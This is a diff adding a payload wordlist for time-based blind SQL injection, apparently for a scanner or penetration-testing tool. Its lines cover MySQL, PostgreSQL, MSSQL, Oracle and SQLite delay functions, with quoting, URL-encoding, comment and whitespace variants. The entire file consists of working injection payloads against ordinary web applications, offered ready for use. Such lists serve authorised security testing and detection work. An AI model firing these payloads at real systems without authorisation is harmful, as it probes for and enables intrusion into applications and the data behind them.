@@ -1,0 +1,147 @@
+# SQL Injection - Time-Based Blind Payloads
+# Causes server delays to confirm injection
+# Tests both 5-second and 10-second delays
+
+# MySQL SLEEP()
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+1' AND SLEEP(5)--
+1' AND SLEEP(5)#
+1' OR SLEEP(5)--
+1 AND SLEEP(5)--
+1 OR SLEEP(5)--
+'; SELECT SLEEP(5)--
+'; SELECT SLEEP(5)#
+" AND SLEEP(5)--
+" OR SLEEP(5)--
+') AND SLEEP(5)--
+') OR SLEEP(5)--
+")) AND SLEEP(5)--
+1' AND SLEEP(5) AND '1'='1
+1') AND SLEEP(5) AND ('1'='1
+1" AND SLEEP(5) AND "1"="1
+
+# MySQL BENCHMARK()
+' AND BENCHMARK(10000000,SHA1('test'))--
+' AND BENCHMARK(10000000,MD5('test'))--
+' OR BENCHMARK(10000000,SHA1('test'))--
+1' AND BENCHMARK(10000000,SHA1('test'))--
+" AND BENCHMARK(10000000,SHA1('test'))--
+' AND BENCHMARK(5000000,SHA1(SHA1('test')))--
+') AND BENCHMARK(10000000,SHA1('test'))--
+
+# MySQL Conditional delays
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=1,SLEEP(5),0)#
+' OR IF(1=1,SLEEP(5),0)--
+' AND (SELECT IF(1=1,SLEEP(5),0))--
+' AND (SELECT * FROM (SELECT SLEEP(5))a)--
+1' AND IF(1=1,SLEEP(5),0)--
+1' AND IF(1=1,SLEEP(5),0)#
+" AND IF(1=1,SLEEP(5),0)--
+') AND IF(1=1,SLEEP(5),0)--
+1 AND IF(1=1,SLEEP(5),0)--
+' OR IF(1=1,BENCHMARK(10000000,SHA1('a')),0)--
+
+# PostgreSQL pg_sleep()
+' AND pg_sleep(5)--
+' OR pg_sleep(5)--
+1' AND pg_sleep(5)--
+1' OR pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+" AND pg_sleep(5)--
+') AND pg_sleep(5)--
+' AND (SELECT pg_sleep(5))--
+1 AND pg_sleep(5)--
+' || pg_sleep(5)--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+' AND 1=(SELECT 1 FROM pg_sleep(5))--
+
+# MSSQL WAITFOR DELAY
+'; WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5';--
+' AND WAITFOR DELAY '0:0:5'--
+1'; WAITFOR DELAY '0:0:5'--
+1' WAITFOR DELAY '0:0:5'--
+" WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+'); WAITFOR DELAY '0:0:5'--
+' IF 1=1 WAITFOR DELAY '0:0:5'--
+'; IF 1=1 WAITFOR DELAY '0:0:5'--
+' AND 1=1 WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:10'--
+
+# MSSQL WAITFOR TIME
+'; WAITFOR TIME '22:00:00'--
+' WAITFOR TIME '22:00:00'--
+
+# Oracle DBMS_PIPE.RECEIVE_MESSAGE
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
+' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
+1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
+" AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
+') AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+
+# Oracle DBMS_LOCK.SLEEP
+' AND DBMS_LOCK.SLEEP(5)=0--
+' OR DBMS_LOCK.SLEEP(5)=0--
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+' AND 1=DBMS_LOCK.SLEEP(5)--
+
+# Oracle UTL_INADDR (causes delay via DNS)
+' AND UTL_INADDR.GET_HOST_ADDRESS('slow.dns.query')--
+
+# SQLite heavy operations (no direct sleep)
+' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--
+
+# Generic conditional delays
+'; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE SLEEP(0) END--
+' AND (CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)--
+' OR (CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+# URL encoded versions
+'%20AND%20SLEEP(5)--
+'%20OR%20SLEEP(5)--
+'%3BSELECT%20SLEEP(5)--
+'%20AND%20pg_sleep(5)--
+'%3B%20WAITFOR%20DELAY%20'0:0:5'--
+
+# 10-second delay variants (for slow networks)
+' AND SLEEP(10)--
+' OR SLEEP(10)--
+'; SELECT SLEEP(10)--
+' AND pg_sleep(10)--
+'; WAITFOR DELAY '0:0:10'--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)='a'--
+
+# Nested delays
+' AND (SELECT SLEEP(5) FROM dual)--
+' AND (SELECT * FROM (SELECT SLEEP(5))a)--
+' UNION SELECT SLEEP(5)--
+' UNION ALL SELECT SLEEP(5)--
+
+# Comment variations
+' AND SLEEP(5)/*
+' AND SLEEP(5)#
+' AND SLEEP(5)-- -
+' AND SLEEP(5);--
+' AND SLEEP(5);#
+
+# Whitespace alternatives
+'/**/AND/**/SLEEP(5)--
+'%09AND%09SLEEP(5)--
+'%0aAND%0aSLEEP(5)--
+'+AND+SLEEP(5)--
+
+# Boolean + Time combined
+' AND 1=1 AND SLEEP(5)--
+' AND 1=2 AND SLEEP(5)--
+' OR 1=1 AND SLEEP(5)--
+' AND 'a'='a' AND SLEEP(5)--
